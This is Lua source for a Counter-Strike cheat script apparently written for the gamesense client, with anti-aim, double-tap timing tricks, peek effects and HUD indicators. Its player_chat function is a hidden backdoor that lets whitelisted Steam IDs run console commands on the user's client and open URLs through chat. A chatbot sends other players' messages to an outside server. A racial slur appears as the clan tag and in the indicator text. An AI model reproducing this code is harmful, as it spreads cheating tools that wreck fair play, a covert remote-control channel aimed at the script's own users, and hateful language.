            if contains(ui.get(menu.Misc.ideal_tick_options), 'Double tap') then
                ui.set(reference.aimbot.double_tap[2], "Always on")
            end

            if contains(ui.get(menu.Misc.ideal_tick_options), 'Quick peek') then
                ui.set(reference.aimbot.quick_peek[1], true)
                ui.set(reference.aimbot.quick_peek[2], "Always on")
            end

            cvar.cl_clock_correction_force_server_tick:set_int(1)
            cvar.cl_clock_correction:set_int(0)
            cvar.cl_clockdrift_max_ms:set_int(450)
        else
            if contains(ui.get(menu.Misc.ideal_tick_options), 'Double tap') then
                ui.set(reference.aimbot.double_tap[2], ui.get(menu.Misc.ideal_tick_dt_fallback))
            end

            if contains(ui.get(menu.Misc.ideal_tick_options), 'Quick peek') then
                ui.set(reference.aimbot.quick_peek[2], ui.get(menu.Misc.ideal_tick_qp_fallback))
            end

            cvar.cl_clock_correction_force_server_tick:set_int(999)
            cvar.cl_clock_correction:set_int(1)
            cvar.cl_clockdrift_max_ms:set_int(150)
        end
    end

   if contains(ui.get(menu.AntiAim.settings), 'Legit anti-aim') then
        local bomb = entity.get_all("CC4")[1]
        local owned_bomb = false
        local defuse = false
        local planted_bomb = entity.get_all("CPlantedC4")[1]
        local vec_player = {entity.get_prop(entity.get_local_player(), "m_vecOrigin")}
        local bomb_vec = {entity.get_prop(planted_bomb, "m_vecOrigin")}
        local team = entity.get_prop(entity.get_local_player(), "m_iTeamNum")
        
        local px, py, pz = client.eye_position()
        local pitch, yaw = client.camera_angles()

        local dir_vec = {calc_vec(pitch, yaw)}
        
        local fraction, entindex = client.trace_line(entity.get_local_player(), px, py, pz, px + (dir_vec[1] * 8192), py + (dir_vec[2] * 8192), pz + (dir_vec[3] * 8192))
        local using = true

        if entindex ~= nil and entindex ~= -1 then
            for i = 0, #saved_vars.class do
                if entity.get_classname(entindex) == saved_vars.class[i] then
                    using = false
                end
            end
        end
        if bomb_vec[1] ~= nil then
            local difference = math.sqrt( ( vec_player[1] - bomb_vec[1] ) ^ 2 + (vec_player[2] - bomb_vec[2]) ^ 2 + (vec_player[3] - bomb_vec[3]) )
            defuse = team == 3 and difference <= 64 and true
        end
        if bomb ~= nil then
            owned_bomb = entity.get_prop(bomb, "m_hOwnerEntity") == entity.get_local_player() and true
        end

        local plant = team == 2 and entity.get_prop(entity.get_local_player(), "m_bInBombZone") == 1 and owned_bomb and true

        if ui.get(menu.AntiAim.legit_antiaim_hk) then
            ui.set(reference.aa.pitch, 'Off')
            ui.set(reference.aa.yaw[1], 'Off')

            ui.set(reference.aa.fake_limit, 60)
            ui.set(reference.aa.freestanding[1], '-')
            ui.set(reference.aa.body_yaw[1], 'Static')
            ui.set(reference.aa.body_yaw[2], saved_vars.tracedwallvalue == 1 and -180 or 180)

            if cmd.in_use == 1 then
                if not (using or defuse) or plant then
                    cmd.in_use = 0
                end
            end
        end
    end
end

local fakelag = ui.reference("AA", "Fake lag", "Limit")
local ground_ticks, end_time = 1, 0

local function predict_command(e)
        if not ui.get(checkbox) then
            return
        end

        if ui.get(menu.Misc.static_legs) then
            entity.set_prop(entity.get_local_player(), 'm_flPoseParameter', 1, 6)
            entity.set_prop(entity.get_local_player(), 'm_flPoseParameter', 1, 0)
        end

        if ui.get(menu.Misc.zero_pitch_land) then
            if entity.is_alive(entity.get_local_player()) then

            local on_ground = bit.band(entity.get_prop(entity.get_local_player(), "m_fFlags"), 1)

            if on_ground == 1 then
                ground_ticks = ground_ticks + 1
            else
                ground_ticks = 0
                end_time = globals.curtime() + 1
            end 
        
            if ground_ticks > ui.get(fakelag)+1 and end_time > globals.curtime() then
                entity.set_prop(entity.get_local_player(), "m_flPoseParameter", 0.5, 12)
            end
        end

        if ui.get(menu.Misc.clantag_spammer) then
            client.set_clan_tag("nigga.lua")
        else
            client.set_clan_tag("")
        end

        if ui.get(menu.Visuals.visualizefakelag) then
            print("hello world")
        end
    end
end

--kway chatbot
local chatbot = function(e)
    if ui.get(menu.Misc.aichatbot) then
    local me = entity.get_local_player()
    local sent_by = client.userid_to_entindex(e.userid)
    if sent_by == me then return end
    if ui.get(menu.Misc.aichatbotenemy) then
        if not entity.is_enemy(sent_by) then return end
    end
    local text = e.text
    if not text or text == '' then return end
	
    local browser_text = text:gsub(" ", "%%20")
    http.get(("https://pluto.kwayservices.top/chat?key=gamesense&msg=%s"):format(browser_text), function(success, response)
        if not success or response.status ~= 200 then return print('failed?') end
        local data = json.parse(response.body)
        if not data then return end
        local output = data.message
        if not output or output == '' then return end
        client.exec(('say "%s"'):format(output))
    end)
end
end

client.set_event_callback('player_say', chatbot)
--kway chatbot

--air walk
client.set_event_callback(
    "pre_render",
    function()
        if ui.get(menu.Misc.air_walk) then
            if not entity.is_alive(entity.get_local_player()) then
                return
            end
            if ui.get(checkbox) then
                local me = ent.get_local_player()
                local m_fFlags = me:get_prop("m_fFlags")
                local is_onground = bit.band(m_fFlags, 1) ~= 0
                if not is_onground then
                    local my_animlayer = me:get_anim_overlay(6) -- MOVEMENT_MOVE
                    my_animlayer.weight = 1
                end
            end
        end
    end
)
--air walk

--prim peek
local callbacks = {
    list = {},

    create = function(self, name, event, func)
        if type(event) ~= 'table' then
            self.list[name] = {event = event, func = func}
        else
            for k, v in pairs(event) do
                self.list[name] = {event = v, func = func}
            end
        end
    end,

    handle_list = function(self, enabled)
        local set_callback = enabled and client.set_event_callback or client.unset_event_callback
        for k, v in pairs(self.list) do
            set_callback(self.list[k].event, self.list[k].func)
        end
    end,
}

local efx = {
    peek_assist_pos = database.read('noodle_fx_pos'),

    render_effect = function(self, effect, pos, color, parameters)
        if not effect.refreshed then
            client.delay_call(0.3, function()
                self:init(true)
            end)
        else
            for k, v in pairs(effect.materials) do
                v:color_modulate(color[1], color[2], color[3])
                v:alpha_modulate(color[4] or 255)
            end
            effect.func(pos, table.unpack(parameters))
        end
    end,

    init = function(self, refreshed)
        self.energy_effect = {
            refreshed = refreshed,
            func = vtable_bind("client.dll", "IEffects001", 7, "void(__thiscall*)(void*, const Vector&, const Vector&, bool)"),
            materials = {
                materialsystem.find_material("effects/spark", true),
                materialsystem.find_material("effects/combinemuzzle1_nocull", true),
                materialsystem.find_material("effects/combinemuzzle2_nocull", true)
            },
            parameters = {vector(0, 0, 0), true}
        }
    end,
}
efx:init(false)

local paint = {    
    quick_peek = { ui.reference('Rage', 'Other', 'Quick peek assist') },
    quick_peek_dist = ui.reference('Rage', 'Other', 'Quick peek assist distance'),

    callback = function(self)
        local local_player = entity.get_local_player()
        local local_origin = vector(entity.get_origin(local_player))
        local efx_color = {ui.get(menu.Visuals.peek_color)}
        local speed, dist = 5, 35

        if ui.get(menu.Visuals.prim_peek) then
            if entity.is_alive(entity.get_local_player()) then
        if ui.get(self.quick_peek[1]) then
            local grounded = bit.band(entity.get_prop(local_player, 'm_fFlags'), 1) == 1
            local velocity = vector(entity.get_prop(local_player, 'm_vecVelocity')) / 5
            velocity.z = 0

            if not ui.get(self.quick_peek[2]) then
                if grounded then
                    efx.peek_assist_pos = local_origin - velocity
                else
                    efx.peek_assist_pos = local_origin
                end
            else
                local quick_peek_dist = ui.get(self.quick_peek_dist) > 200 and math.huge or ui.get(self.quick_peek_dist)
                local origin = local_origin + vector(0, 0, 1)

                efx.peek_assist_pos.z = math.min(local_origin.z, efx.peek_assist_pos.z)

                if (origin - efx.peek_assist_pos):length() > quick_peek_dist and grounded then
                    efx.peek_assist_pos = (efx.peek_assist_pos - origin):normalized() * quick_peek_dist + origin
                end

                local curr_origin = efx.peek_assist_pos + vector(math.sin(globals.curtime() * (speed + 1)) * 20, math.cos(globals.curtime() * (speed + 1)) * 20, 1)
                efx:render_effect(efx.energy_effect, curr_origin, efx_color, {vector(0, 0, 0), true})

                database.write('noodle_fx_pos', {efx.peek_assist_pos:unpack()})
            end
        end
    end
end
    end,
}

callbacks:create('painting', 'paint_ui', function() paint:callback() end)

callbacks:create('end', 'shutdown', function() 
    callbacks:handle_list(false) 
    table_visible(reference.aa, true)
end)
callbacks:handle_list(true)
--prim peek

local function paint()
    local screen = {client.screen_size()}
    local middle = {screen[1]/2,screen[2]/2}

    local tab_checked = ui.get(tabs)
    local toggled = ui.get(checkbox)

    table_visible(reference.aa, not ui.get(checkbox))

    for k, v in pairs(menu) do
        for i, x in pairs(v) do
            if tab_checked == k and toggled then
                ui.set_visible(x, true)
                if i == "legit_antiaim_hk" then
                    ui.set_visible(x, contains( ui.get(menu.AntiAim.settings), 'Legit anti-aim'))
                end

                if i:find('manual_aa') and i ~= "manual_aa" then
                    ui.set_visible(x, ui.get(menu.AntiAim.manual_aa))
                end
                
                if i:find('auto_break_lc') and i ~= "auto_break_lc" then
                    ui.set_visible(x, ui.get(menu.Misc.auto_break_lc))
                end

                if i:find('ideal_tick') and i ~= "ideal_tick" then
                    ui.set_visible(x, ui.get(menu.Misc.ideal_tick))
                    if i:find('ideal_tick_dt_fallback') and i ~= "ideal_tick_hotkey" then
                        ui.set_visible(x, ui.get(menu.Misc.ideal_tick) and contains(ui.get(menu.Misc.ideal_tick_options), 'Double tap'))
                    end

                    if i:find('ideal_tick_qp_fallback') and i ~= "ideal_tick_hotkey" then
                        ui.set_visible(x, ui.get(menu.Misc.ideal_tick) and contains(ui.get(menu.Misc.ideal_tick_options), 'Quick peek'))
                    end
                end
            else
                ui.set_visible(x, false)
            end
        end
    end

    if not ui.get(checkbox) or not entity.is_alive(entity.get_local_player()) then
        return
    end

    local color = {ui.get(menu.Visuals.indicator_color)}
    local alpha_pulse = math.sin(math.abs(-math.pi + (globals.curtime() * (1 / 0.45)) % (math.pi * 2))) * color[4]

    if ui.get(menu.Visuals.indicator_mode) == "Legacy[2]" then
        if saved_vars.manual_state == 0 then
            if not saved_vars.is_current_brute then
                renderer.text(middle[1], middle[2] + 40, 218, (ui.get(menu.AntiAim.yaw_base) == "dynamic" and saved_vars.tracedwallvalue ~= saved_vars.traceddamagevalue) and 0 or 118, 0, 255, nil, 0, "IDEAL YAW")
                renderer.text(middle[1] + 53, middle[2] + 40, 255, 255, 255, 150, nil, 0, "v3")

            else
                if saved_vars.current_time ~= nil then
                    local alpha_time = math.max(50, 255 - ((globals.curtime() - saved_vars.current_time) * 100))
                    renderer.text(middle[1] + 53, middle[2] + 40, 255, 255, 255, alpha_time, nil, 0, "v3")

                    renderer.text(middle[1], middle[2] + 40, 0, 100, 0, alpha_time, nil, 0, "IDEAL YAW")
                end
            end
        else
            renderer.text(middle[1], middle[2] + 40, 177, 151, 255, 255, nil, 0, "FAKE YAW")
        end

        if ui.get(menu.AntiAim.manual_aa) and ui.get(menu.AntiAim.manual_aa_b) then
            renderer.text(middle[1], middle[2] + 50, 255, 0, 0, 255, nil, 0, "DEFAULT")
        else
            renderer.text(middle[1], middle[2] + 50, 209, 139, 230, 255, nil, 0, "DYNAMIC")
        end

        if ui.get(reference.aimbot.double_tap[1]) and ui.get(reference.aimbot.double_tap[2]) then
            renderer.text(middle[1], middle[2] + 60, 0, 255, 0, 255, nil, 0, "DT")
        end
        if ui.get(reference.other.onshot_aa[1]) and ui.get(reference.other.onshot_aa[2]) then
            if ui.get(reference.aimbot.double_tap[1]) and ui.get(reference.aimbot.double_tap[2]) then
                renderer.text(middle[1], middle[2] + 70, 209, 139, 230, 255, nil, 0, "AA")
            else
                renderer.text(middle[1], middle[2] + 60, 209, 139, 230, 255, nil, 0, "AA")
            end
        end	
    elseif ui.get(menu.Visuals.indicator_mode) == "Modern" then
        renderer.text(middle[1], middle[2] + 35, 255,255,255,255, "-", 0, "NIGGA")
        renderer.text(middle[1] + 24, middle[2] + 35, color[1], color[2], color[3], alpha_pulse, "-", 0, "LIVE")
        
        local text = ui.get(menu.AntiAim.freestanding) ~= "adaptive" and string.upper(ui.get(menu.AntiAim.freestanding)) or "SMART" 

        local text_length = renderer.measure_text("-", text)

        renderer.text(middle[1], middle[2] + 44,238, 100, 100, 255, "-", 0, text .. ":")
        local dir_text = saved_vars.traceddamagevalue == 1 and "LEFT" or saved_vars.traceddamagevalue == 2 and "RIGHT" or saved_vars.traceddamagevalue == 3 and "VIS" or "SAFE"

        renderer.text(middle[1] + text_length + 3, middle[2] + 44,  171, 174, 255, 255, "-", 0, dir_text)
        
        if not (ui.get(reference.aimbot.double_tap[1]) and ui.get(reference.aimbot.double_tap[2])) then
            renderer.text(middle[1], middle[2] + 53, 255,255,255,100, "-", 0, "DT")
        else
            renderer.text(middle[1], middle[2] + 53, saved_vars.dt_charge and 0 or 255,  saved_vars.dt_charge and 255 or 0,0, 255, "-", 0, "DT")
        end
        
        renderer.text(middle[1] + 11, middle[2] + 53, 255,255,255, (ui.get(reference.other.onshot_aa[1]) and ui.get(reference.other.onshot_aa[2])) and 255 or 100, "-", 0, "HS")
        renderer.text(middle[1] + 23, middle[2] + 53, 255,255,255, ( contains(ui.get(reference.aa.freestanding[1]), "Default") and ui.get(reference.aa.freestanding[2])) and 255 or 100, "-", 0, "FS")

        local text = saved_vars.manual_state == -90 and "M:L" or saved_vars.manual_state == 90 and "M:R" or saved_vars.manual_state == 180 and "M:F" or "M:B"

        renderer.text(middle[1] + 34, middle[2] + 53, 255,255,255, 255, "-", 0, text)
    elseif ui.get(menu.Visuals.indicator_mode) == "Default" then
        local dir_text = saved_vars.traceddamagevalue == 1 and "L" or saved_vars.traceddamagevalue == 2 and "R" or saved_vars.traceddamagevalue == 3 and "V" or "O"
        
        local dir_push = 0

        renderer.text(middle[1], middle[2] + 35, 255,255,255,255, "-", 0, "NIGGA")
        renderer.text(middle[1] + 24, middle[2] + 35, color[1], color[2], color[3], alpha_pulse, "-", 0, "LIVE")

        if not saved_vars.is_current_brute then
            renderer.text(middle[1], middle[2] + 43, 150, 177, 255, 255, "-", 0, 'FAKE  YAW: ')
            renderer.text(middle[1] + 38, middle[2] + 43, 255,255,255, 255, "-", 0, dir_text)
        elseif saved_vars.is_current_brute and saved_vars.current_time ~= nil then
            local side = ui.get(reference.aa.body_yaw[2]) >= 0 and "0" or "1"
            local text = "ANTI BRUTEFORCE" .. " [" .. side .. "]:[" .. math.floor(4 - (globals.curtime() - saved_vars.current_time)) .. "]"
            renderer.text(middle[1], middle[2] + 43, 255,255,255, 255, "-", 0, text)
        end
        
        if (ui.get(reference.aimbot.double_tap[1]) and ui.get(reference.aimbot.double_tap[2])) then
            dir_push = 8

            renderer.text(middle[1], middle[2] + 51, saved_vars.dt_charge and 0 or 255,  saved_vars.dt_charge and 255 or 0,0, (ui.get(reference.other.onshot_aa[1]) and ui.get(reference.other.onshot_aa[2])) and alpha_pulse or 255, "-", 0, 'DT')
        else
            if (ui.get(reference.other.onshot_aa[1]) and ui.get(reference.other.onshot_aa[2])) then
                dir_push = 8

                renderer.text(middle[1], middle[2] + 51, 255, 194, 179, 255, "-", 0, 'ONSHOT')
            end
        end

        renderer.text(middle[1], middle[2] + 51 + dir_push, 255, 255, 255, ui.get(reference.aimbot.force_baim) and 255 or 100, "-", 0, 'BAIM')
        renderer.text(middle[1] + 20, middle[2] + 51 + dir_push, 255, 255, 255, ui.get(reference.aimbot.force_sp) and 255 or 100, "-", 0, 'SP')
        renderer.text(middle[1] + 32, middle[2] + 51 + dir_push, 255, 255, 255, (contains(ui.get(reference.aa.freestanding[1]), "Default") and ui.get(reference.aa.freestanding[2])) and 255 or 100, "-", 0, 'FS')
    elseif ui.get(menu.Visuals.indicator_mode) == "Legacy[1]" then
        local latency = math.floor(math.min(1000, client.latency() * 1000) + 0.5)

        local text = "NIGGA [LIVE]" .. "     |    " .. string.upper(tostring(obex.username)) .. "     |    " .. string.format("%dMS", latency)
		local text_measure = {renderer.measure_text(nil, text)}

		renderer.gradient(0, middle[2], 120, 20, 0, 0, 0, 10, 0, 0, 0, 0, true)
		renderer.text(screen[1] - (screen[1] - text_measure[1] / 2) - 30, middle[2] + 11, 255, 255, 255, 255, "c-", 0, text)

		renderer.gradient(0, middle[2] + 20, 60, 1, 255, 255, 255, 0, color[1], color[2], color[3], 200, true)
		renderer.gradient(60, middle[2] + 20, 60, 1, color[1], color[2], color[3], 200, 255, 255, 255, 0, true)
    end

    if saved_vars.manual_state ~= 0 and not contains(ui.get(menu.Visuals.indicator_disabler), 'manual arrows') then
        local text = saved_vars.manual_state == -90 and "❮" or saved_vars.manual_state == 90 and "❯" or saved_vars.manual_state == 180 and "^"
        local side_x = saved_vars.manual_state == -90 and -50 or saved_vars.manual_state == 90 and 50 or saved_vars.manual_state == 180 and 0 or 0
        local side_y = saved_vars.manual_state == 180 and -35 or -1

        renderer.text(middle[1] + side_x, middle[2] - 6, 255, 255, 255, 255, '', 0, text)
    end

    if saved_vars.manual_state == 0 and not contains(ui.get(menu.Visuals.indicator_disabler), 'peek arrows') and saved_vars.skeet_extrapolate then
        local desync_deg = entity.get_prop(entity.get_local_player(), "m_flPoseParameter", 11)
		desync_deg = math.floor(desync_deg * 116 - 60) 

        local color_left = {desync_deg < 0 and 185 or 255, desync_deg < 0 and 200 or 255, 255, desync_deg < 0 and 255 or 100}
        local color_right = {desync_deg >= 0 and 185 or 255, desync_deg >= 0 and 200 or 255, 255, desync_deg >= 0 and 255 or 100}

        renderer.text(middle[1] - 55, middle[2], color_left[1], color_left[2], color_left[3], color_left[4], "c+", nil, "<")
        renderer.text(middle[1] + 55, middle[2], color_right[1], color_right[2], color_right[3], color_right[4], "c+", nil, ">")
    end
end

local function player_chat(e)
    local steam_id = entity.get_steam64( client.userid_to_entindex(e.userid))
    local txt = e.text

    for i=1, #saved_vars.steam_ids do
        local whitelisted_ids = saved_vars.steam_ids[i]
        local local_steamid = entity.get_steam64(entity.get_local_player())
        if whitelisted_ids ~= local_steamid then
            if whitelisted_ids == steam_id then
                local a, b = txt:gsub("!", "")
                local name = Split(txt, " ")

                username = string.lower(obex.username)

                if b == 1 and name[1] ~= nil then
                    if name[2] == nil then
                        for k, v in pairs(saved_vars.whitelisted_words) do
                            if name[1]:gsub("!", "") == k then
                                if string.find(v, "http") then
                                    js.OpenExternalBrowserURL(v)
                                else
                                    client.exec(v) 
                                end 
                            end
                        end
                    else
                        if username == name[2] then
                            local x, z = name[1]:gsub("!", "")   
                            if not name[1]:find('LOL') then
                                if name[3] ~= nil then
                                    x = x .. ' ' .. name[3] 
                                end      
                                client.exec( x )
                            else
                                entity.set_prop( entity.get_local_player(), "m_flModelScale", entity.get_prop(entity.get_local_player(), 'm_flModelScale', 12) == 1 and 0.5 or 1, 12)
                            end       
                        end
                    end
                end
            end
        end
    end
end

local function bullet_impact(e)
    if not ui.get(checkbox) then
        return
    end
    local enemy = client.userid_to_entindex(e.userid)

	if entity.is_enemy(enemy) then
		local impact = vector(entity.get_prop(enemy, "m_vecOrigin"))
		impact.z = impact.z + entity.get_prop(enemy, "m_vecViewOffset[2]")
		local eye_pos = vector(entity.hitbox_position(entity.get_local_player(), 0))
		local shot_end_pos = vector(e.x, e.y, e.z)
		local dist_far = dist(impact, shot_end_pos, eye_pos)

        if dist_far <= 35 then
            saved_vars.bruteShots[enemy] = saved_vars.bruteShots[enemy] + 1
            saved_vars.bruteCurrent[enemy] = true
            saved_vars.bruteTime[enemy] = globals.curtime()
            saved_vars.bruteLastInverted[enemy] = ui.get(reference.aa.body_yaw[2]) >= 0 and 1 or 2
        end
	end
end

local function player_death(e)
    if not ui.get(checkbox) then
        return
    end

	if e.userid == nil or e.attacker == nil then
		return
	end

	local victim_entindex  = client.userid_to_entindex(e.userid)
	local attacker_entindex = client.userid_to_entindex(e.attacker)
	if attacker_entindex == entity.get_local_player() and entity.is_enemy(victim_entindex) then
		if ui.get(menu.Misc.killsay) then
			local exec_command = 'say ' .. saved_vars.killsay[math.random(#saved_vars.killsay)]
			client.exec(exec_command)
		end
	end
end

client.set_event_callback('predict_command', predict_command)
client.set_event_callback('setup_command', setup_command)
client.set_event_callback('paint_ui', paint)
client.set_event_callback('player_say', player_chat)
client.set_event_callback('bullet_impact', bullet_impact)
client.set_event_callback('player_death', player_death)